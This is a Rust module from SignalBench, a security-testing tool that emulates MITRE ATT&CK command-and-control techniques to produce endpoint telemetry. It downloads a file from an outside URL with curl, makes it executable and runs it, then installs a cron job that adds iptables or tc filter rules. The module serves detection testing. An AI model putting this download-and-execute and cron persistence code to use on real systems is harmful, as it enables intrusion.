// SIGNALBENCH - Endpoint Telemetry Generator
// Command and Control technique telemetry patterns
// 
// This module contains command and control techniques according to MITRE ATT&CK framework
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use log::{debug, error, info, warn};
use uuid::Uuid;

// ======================================
// T1105 - Ingress Tool Transfer
// ======================================
pub struct IngressToolTransfer {}

#[async_trait]
impl AttackTechnique for IngressToolTransfer {
    fn info(&self) -> Technique {
        Technique {
            id: "T1105".to_string(),
            name: "Ingress Tool Transfer".to_string(),
            description: "Generates telemetry for ingress tool transfer activities".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "url".to_string(),
                    description: "URL of the file to download".to_string(),
                    required: false,
                    default: Some("https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string()),
                },
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save the downloaded file".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_tool_transfer".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save download and execution log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_ingress_transfer.log".to_string()),
                },
                TechniqueParameter {
                    name: "execute".to_string(),
                    description: "Whether to attempt execution of downloaded file".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Network monitoring can detect malicious file downloads and execution attempts".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let url = config
                .parameters
                .get("url")
                .unwrap_or(&"https://wildfire.paloaltonetworks.com/publicapi/test/elf".to_string())
                .clone();
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_malware_test".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_ingress_transfer.log".to_string())
                .clone();
            let execute = config
                .parameters
                .get("execute")
                .unwrap_or(&"true".to_string())
                .clone()
                .to_lowercase() == "true";
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would download file from {url} to {output_file} and attempt execution: {execute}"),
                    artifacts: vec![output_file.clone(), log_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Ingress Tool Transfer - Malware Download Telemetry").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1105").unwrap();
            writeln!(log_file_handle, "# URL: {url}").unwrap();
            writeln!(log_file_handle, "# Output file: {output_file}").unwrap();
            writeln!(log_file_handle, "# Execute after download: {execute}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Download file using curl
            writeln!(log_file_handle, "\n## Downloading file from URL").unwrap();
            
            let download_start = chrono::Local::now();
            writeln!(log_file_handle, "Download started at: {download_start}").unwrap();
            
            // Use curl to download the file
            let curl_output = Command::new("curl")
                .arg("-L")  // Follow redirects
                .arg("-s")  // Silent mode
                .arg("-o")  // Output to file
                .arg(&output_file)
                .arg(&url)
                .output()
                .await;
                
            let download_end = chrono::Local::now();
            let download_duration = download_end.signed_duration_since(download_start);
            writeln!(log_file_handle, "Download completed at: {} (took {} ms)", 
                     download_end, download_duration.num_milliseconds()).unwrap();
            
            // Check download status
            match curl_output {
                Ok(output) => {
                    let exit_status = output.status.code().unwrap_or(-1);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    
                    if exit_status == 0 {
                        writeln!(log_file_handle, "Download successful!").unwrap();
                        
                        // Check if file exists and get its size
                        if let Ok(metadata) = std::fs::metadata(&output_file) {
                            let file_size = metadata.len();
                            writeln!(log_file_handle, "Downloaded file size: {file_size} bytes").unwrap();
                            
                            // Get file type
                            let file_type_output = Command::new("file")
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            if let Ok(file_type_result) = file_type_output {
                                let file_type = String::from_utf8_lossy(&file_type_result.stdout);
                                writeln!(log_file_handle, "File type: {file_type}").unwrap();
                            }
                            
                            // Calculate file hash
                            let hash_output = Command::new("sha256sum")
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            if let Ok(hash_result) = hash_output {
                                let hash_output = String::from_utf8_lossy(&hash_result.stdout);
                                writeln!(log_file_handle, "SHA256 hash: {hash_output}").unwrap();
                            }
                        } else {
                            writeln!(log_file_handle, "WARNING: File doesn't exist after successful download!").unwrap();
                        }
                    } else {
                        writeln!(log_file_handle, "Download failed with status code: {exit_status}").unwrap();
                        if !stderr.is_empty() {
                            writeln!(log_file_handle, "Error: {stderr}").unwrap();
                        }
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Download failed: {e}").unwrap();
                }
            }
            
            // Attempt execution if requested
            if execute {
                writeln!(log_file_handle, "\n## Attempting execution of downloaded file").unwrap();
                
                // First make it executable
                let chmod_output = Command::new("chmod")
                    .arg("+x")
                    .arg(&output_file)
                    .output()
                    .await;
                    
                match chmod_output {
                    Ok(output) => {
                        let exit_status = output.status.code().unwrap_or(-1);
                        if exit_status == 0 {
                            writeln!(log_file_handle, "Successfully set executable permissions").unwrap();
                            
                            // Now attempt to execute it
                            writeln!(log_file_handle, "Attempting execution...").unwrap();
                            let exec_start = chrono::Local::now();
                            
                            // Execute with timeout to prevent hanging
                            let exec_output = Command::new("timeout")
                                .arg("5")  // 5 second timeout
                                .arg(&output_file)
                                .output()
                                .await;
                                
                            let exec_end = chrono::Local::now();
                            let exec_duration = exec_end.signed_duration_since(exec_start);
                            
                            match exec_output {
                                Ok(output) => {
                                    let exit_status = output.status.code().unwrap_or(-1);
                                    let stdout = String::from_utf8_lossy(&output.stdout);
                                    let stderr = String::from_utf8_lossy(&output.stderr);
                                    
                                    writeln!(log_file_handle, "Execution completed at: {} (took {} ms)", 
                                             exec_end, exec_duration.num_milliseconds()).unwrap();
                                    writeln!(log_file_handle, "Exit status: {exit_status}").unwrap();
                                    
                                    if !stdout.is_empty() {
                                        let summary = if stdout.len() > 200 {
                                            format!("{}... (truncated)", &stdout[0..200])
                                        } else {
                                            stdout.to_string()
                                        };
                                        writeln!(log_file_handle, "STDOUT: {summary}").unwrap();
                                    }
                                    
                                    if !stderr.is_empty() {
                                        let summary = if stderr.len() > 200 {
                                            format!("{}... (truncated)", &stderr[0..200])
                                        } else {
                                            stderr.to_string()
                                        };
                                        writeln!(log_file_handle, "STDERR: {summary}").unwrap();
                                    }
                                },
                                Err(e) => {
                                    writeln!(log_file_handle, "Execution failed: {e}").unwrap();
                                }
                            }
                        } else {
                            writeln!(log_file_handle, "Failed to set executable permissions").unwrap();
                        }
                    },
                    Err(e) => {
                        writeln!(log_file_handle, "Failed to set executable permissions: {e}").unwrap();
                    }
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Ingress tool transfer complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Ingress tool transfer completed. File downloaded to {output_file}, Logs: {log_file}"),
                artifacts: vec![output_file.to_string(), log_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1205 - Traffic Signaling
// ======================================
pub struct TrafficSignaling {}

#[async_trait]
impl AttackTechnique for TrafficSignaling {
    fn info(&self) -> Technique {
        Technique {
            id: "T1205".to_string(),
            name: "Traffic Signaling".to_string(),
            description: "Uses cron to install TCP filters on network interfaces for covert signaling and C2 communications".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "interface".to_string(),
                    description: "Network interface to install filter on".to_string(),
                    required: false,
                    default: Some("eth0".to_string()),
                },
                TechniqueParameter {
                    name: "filter_type".to_string(),
                    description: "Type of TCP filter (iptables, tc_filter)".to_string(),
                    required: false,
                    default: Some("iptables".to_string()),
                },
                TechniqueParameter {
                    name: "target_port".to_string(),
                    description: "TCP port to filter for signaling".to_string(),
                    required: false,
                    default: Some("8443".to_string()),
                },
                TechniqueParameter {
                    name: "cron_schedule".to_string(),
                    description: "Cron expression for filter installation".to_string(),
                    required: false,
                    default: Some("*/15 * * * *".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save traffic signaling log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_traffic_signaling.log".to_string()),
                },
            ],
            detection: "Monitor cron job modifications, iptables/tc filter rule changes, network interface configuration changes, and unusual traffic patterns on filtered ports".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let interface = config
                .parameters
                .get("interface")
                .unwrap_or(&"eth0".to_string())
                .clone();
                
            let filter_type = config
                .parameters
                .get("filter_type")
                .unwrap_or(&"iptables".to_string())
                .clone();
                
            let target_port = config
                .parameters
                .get("target_port")
                .unwrap_or(&"8443".to_string())
                .clone();
                
            let cron_schedule = config
                .parameters
                .get("cron_schedule")
                .unwrap_or(&"*/15 * * * *".to_string())
                .clone();
                
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_traffic_signaling.log".to_string())
                .clone();

            let id = Uuid::new_v4().to_string().split('-').next().unwrap_or("signalbench").to_string();
            let temp_cron_file = format!("/tmp/signalbench_traffic_signal_{id}");
            let cron_job_id = format!("traffic_signal_{id}");
            let rule_artifact = format!("filter_rule_{id}");
            
            if dry_run {
                info!("[DRY RUN] Would install traffic signaling on interface: {interface}");
                info!("[DRY RUN] Would create cron job: {cron_schedule}");
                info!("[DRY RUN] Would filter TCP port: {target_port}");
                info!("[DRY RUN] Would use filter type: {filter_type}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!("DRY RUN: Would install {filter_type} filter on {interface}:{target_port} via cron"),
                    artifacts: vec![log_file, temp_cron_file, cron_job_id, rule_artifact],
                    cleanup_required: false,
                });
            }

            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            writeln!(log_file_handle, "# SignalBench Traffic Signaling Test").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK: T1205").unwrap();
            writeln!(log_file_handle, "# Interface: {}", interface).unwrap();
            writeln!(log_file_handle, "# Filter Type: {}", filter_type).unwrap();
            writeln!(log_file_handle, "# Target Port: {}", target_port).unwrap();
            writeln!(log_file_handle, "# Cron Schedule: {}", cron_schedule).unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();

            // Check if interface exists
            let interface_check = Command::new("ip")
                .args(["link", "show", &interface])
                .output()
                .await;
                
            match interface_check {
                Ok(output) => {
                    if !output.status.success() {
                        writeln!(log_file_handle, "WARNING: Interface {} not found, proceeding with simulation", interface).unwrap();
                    } else {
                        writeln!(log_file_handle, "Interface {} found and available", interface).unwrap();
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Could not check interface: {}", e).unwrap();
                }
            }

            // Create the filter command based on type
            let filter_command = match filter_type.as_str() {
                "iptables" => {
                    format!("/usr/sbin/iptables -A INPUT -i {} -p tcp --dport {} -j LOG --log-prefix 'SIGNALING: ' 2>/dev/null || true", interface, target_port)
                },
                "tc_filter" => {
                    format!("/usr/sbin/tc filter add dev {} protocol ip parent 1: prio 1 u32 match ip dport {} 0xffff 2>/dev/null || true", interface, target_port)
                },
                _ => {
                    format!("/usr/sbin/iptables -A INPUT -i {} -p tcp --dport {} -j LOG --log-prefix 'SIGNALING: ' 2>/dev/null || true", interface, target_port)
                }
            };

            writeln!(log_file_handle, "\n## Creating Cron Job for Traffic Signaling").unwrap();
            writeln!(log_file_handle, "Filter command: {}", filter_command).unwrap();

            // Get current crontab
            let status = Command::new("crontab")
                .args(["-l"])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::null())
                .output()
                .await
                .map_err(|e| format!("Failed to get current crontab: {e}"))?;
            
            let mut crontab_content = String::from_utf8_lossy(&status.stdout).to_string();
            
            // Add our traffic signaling cron job
            crontab_content.push_str(&format!("\n# SignalBench Traffic Signaling (GoCortex.io) - {id}\n"));
            crontab_content.push_str(&format!("{} {}\n", cron_schedule, filter_command));
            
            // Write to temporary file
            let mut file = File::create(&temp_cron_file)
                .map_err(|e| format!("Failed to create temporary cron file: {e}"))?;
            
            file.write_all(crontab_content.as_bytes())
                .map_err(|e| format!("Failed to write to temporary cron file: {e}"))?;
            
            // Install the new crontab
            let status = Command::new("crontab")
                .args([&temp_cron_file])
                .status()
                .await
                .map_err(|e| format!("Failed to install crontab: {e}"))?;
                
            if !status.success() {
                writeln!(log_file_handle, "ERROR: Failed to install crontab").unwrap();
                return Err("Failed to install crontab".to_string());
            }

            writeln!(log_file_handle, "Cron job installed successfully").unwrap();

            // Test the filter command once to verify it works
            writeln!(log_file_handle, "\n## Testing Filter Installation").unwrap();
            let test_result = Command::new("bash")
                .arg("-c")
                .arg(&filter_command)
                .output()
                .await;
                
            match test_result {
                Ok(output) => {
                    let exit_code = output.status.code().unwrap_or(-1);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    
                    writeln!(log_file_handle, "Test execution exit code: {}", exit_code).unwrap();
                    if !stderr.is_empty() {
                        writeln!(log_file_handle, "Test execution stderr: {}", stderr).unwrap();
                    }
                    
                    if exit_code == 0 {
                        writeln!(log_file_handle, "Filter command executed successfully").unwrap();
                    } else if stderr.contains("Permission denied") || stderr.contains("Operation not permitted") {
                        writeln!(log_file_handle, "WARNING: Filter command requires root privileges - cron job may fail on execution").unwrap();
                    } else {
                        writeln!(log_file_handle, "Filter command may have failed - check if iptables/tc tools are available and have proper permissions").unwrap();
                    }
                },
                Err(e) => {
                    writeln!(log_file_handle, "Failed to test filter command: {}", e).unwrap();
                }
            }

            // Check current filter rules
            writeln!(log_file_handle, "\n## Current Network Filter Status").unwrap();
            if filter_type == "iptables" {
                let iptables_check = Command::new("/usr/sbin/iptables")
                    .args(["-L", "INPUT", "-n"])
                    .output()
                    .await;
                    
                if let Ok(output) = iptables_check {
                    let rules = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Current iptables INPUT rules:\n{}", rules).unwrap();
                } else {
                    writeln!(log_file_handle, "Could not read iptables rules (may require root privileges)").unwrap();
                }
            } else {
                let tc_check = Command::new("/usr/sbin/tc")
                    .args(["filter", "show", "dev", &interface])
                    .output()
                    .await;
                    
                if let Ok(output) = tc_check {
                    let rules = String::from_utf8_lossy(&output.stdout);
                    writeln!(log_file_handle, "Current tc filters on {}:\n{}", interface, rules).unwrap();
                } else {
                    writeln!(log_file_handle, "Could not read tc filters (may require root privileges)").unwrap();
                }
            }

            info!("Traffic signaling cron job installed for {}:{}", interface, target_port);
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Traffic signaling cron job installed on {}:{} using {}", interface, target_port, filter_type),
                artifacts: vec![log_file, temp_cron_file, cron_job_id, format!("{}|{}|{}|{}", rule_artifact, filter_type, interface, target_port)],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                // Remove temporary cron files
                if artifact.starts_with("/tmp/signalbench_traffic_signal_") && Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("Failed to remove temporary cron file {artifact}: {e}");
                    } else {
                        info!("Removed temporary file: {artifact}");
                    }
                }
                
                // Remove cron job
                if artifact.starts_with("traffic_signal_") {
                    let id = artifact.trim_start_matches("traffic_signal_");
                    
                    // Get current crontab
                    let output = Command::new("crontab")
                        .args(["-l"])
                        .output()
                        .await
                        .map_err(|e| format!("Failed to get current crontab: {e}"))?;
                    
                    let crontab_content = String::from_utf8_lossy(&output.stdout).to_string();
                    
                    // Filter out our specific traffic signaling cron job by ID only
                    let lines: Vec<&str> = crontab_content.lines().collect();
                    let mut new_lines = Vec::new();
                    let mut skip_next = false;
                    
                    for line in lines {
                        if line.contains(&format!("SignalBench Traffic Signaling (GoCortex.io) - {id}")) {
                            skip_next = true; // Skip the comment line and the next cron job line
                            continue;
                        }
                        if skip_next {
                            skip_next = false; // Skip the actual cron job line after the comment
                            continue;
                        }
                        new_lines.push(line);
                    }
                    
                    let new_crontab = new_lines.join("\n");
                    
                    // Write to temporary file
                    let temp_file = format!("/tmp/signalbench_traffic_cleanup_{}", Uuid::new_v4());
                    let mut file = File::create(&temp_file)
                        .map_err(|e| format!("Failed to create temporary cron file: {e}"))?;
                    
                    file.write_all(new_crontab.as_bytes())
                        .map_err(|e| format!("Failed to write to temporary cron file: {e}"))?;
                    
                    // Install the new crontab
                    let status = Command::new("crontab")
                        .args([&temp_file])
                        .status()
                        .await
                        .map_err(|e| format!("Failed to install crontab: {e}"))?;
                        
                    if !status.success() {
                        return Err("Failed to install crontab during cleanup".to_string());
                    }
                    
                    // Cleanup temporary file
                    if let Err(e) = fs::remove_file(&temp_file) {
                        warn!("Failed to remove temporary cron file {temp_file}: {e}");
                    }
                    
                    info!("Removed traffic signaling cron job with ID {id}");
                }
                
                // Remove network filter rules
                if artifact.starts_with("filter_rule_") && artifact.contains("|") {
                    let parts: Vec<&str> = artifact.split('|').collect();
                    if parts.len() >= 4 {
                        let filter_type = parts[1];
                        let interface = parts[2];
                        let target_port = parts[3];
                        
                        // Generate delete commands to remove the actual filter rules
                        match filter_type {
                            "iptables" => {
                                // Remove the specific LOG rule we added
                                let delete_cmd = format!("/usr/sbin/iptables -D INPUT -i {} -p tcp --dport {} -j LOG --log-prefix 'SIGNALING: ' 2>/dev/null || true", interface, target_port);
                                let delete_result = Command::new("bash")
                                    .arg("-c")
                                    .arg(&delete_cmd)
                                    .output()
                                    .await;
                                    
                                match delete_result {
                                    Ok(_) => info!("Attempted to remove iptables rule for {}:{}", interface, target_port),
                                    Err(e) => warn!("Failed to execute iptables delete command: {}", e),
                                }
                            },
                            "tc_filter" => {
                                // Remove tc filter (more complex, try to find and delete matching filters)
                                let delete_cmd = format!("/usr/sbin/tc filter del dev {} protocol ip parent 1: prio 1 2>/dev/null || true", interface);
                                let delete_result = Command::new("bash")
                                    .arg("-c")
                                    .arg(&delete_cmd)
                                    .output()
                                    .await;
                                    
                                match delete_result {
                                    Ok(_) => info!("Attempted to remove tc filter for {}", interface),
                                    Err(e) => warn!("Failed to execute tc delete command: {}", e),
                                }
                            },
                            _ => {
                                warn!("Unknown filter type for cleanup: {}", filter_type);
                            }
                        }
                    }
                }
                
                // Remove log files
                if artifact.ends_with("traffic_signaling.log") && Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("Failed to remove log file {artifact}: {e}");
                    } else {
                        info!("Removed log file: {artifact}");
                    }
                }
            }
            
            Ok(())
        })
    }
}